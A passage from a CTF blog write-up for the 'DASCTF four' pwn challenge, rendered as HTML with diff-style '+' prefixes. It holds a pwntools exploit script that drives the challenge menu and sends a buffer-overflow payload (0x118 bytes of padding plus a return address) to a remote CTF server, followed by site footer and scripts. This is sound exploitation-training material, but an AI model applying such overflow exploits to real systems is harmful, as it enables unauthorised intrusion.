+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = process(&quot;./pwn&quot;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,29762)</span><br><span class="line">p.recvuntil(&quot;your choice : \n&quot;)</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(0x5FF0 - 1))</span><br><span class="line">payload = &quot;aa&quot; + &quot;flag\x00&quot; * 4910</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;n&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;3&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;aa&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">payload = &quot;output.txt\x00&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;your choice : \n&quot;)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.recvuntil(&quot;info&gt;&gt;&quot;)</span><br><span class="line">payload = &quot;:`!!&gt;~3&gt;@z*&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendlineafter(&quot;your choice : \n&quot;,str(5))</span><br><span class="line">payload=&#x27;a&#x27;*0x118+p64(0x602121)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+            </div>
+
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/04/19/360chunqiu2017-smallest/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">360chunqiu2017_smallest</span>
+                                    <span class="post-nav-item">下一篇</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">four</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASCTF-four"><span class="nav-text">DASCTF four</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-text">新学到的知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="nav-text">保护检查</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97"><span class="nav-text">偏移计算</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+
+
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">b4nd1t</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a> 驱动</span>
+                <br>
+            <span class="theme-version-container">主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.0.3</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/layouts/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
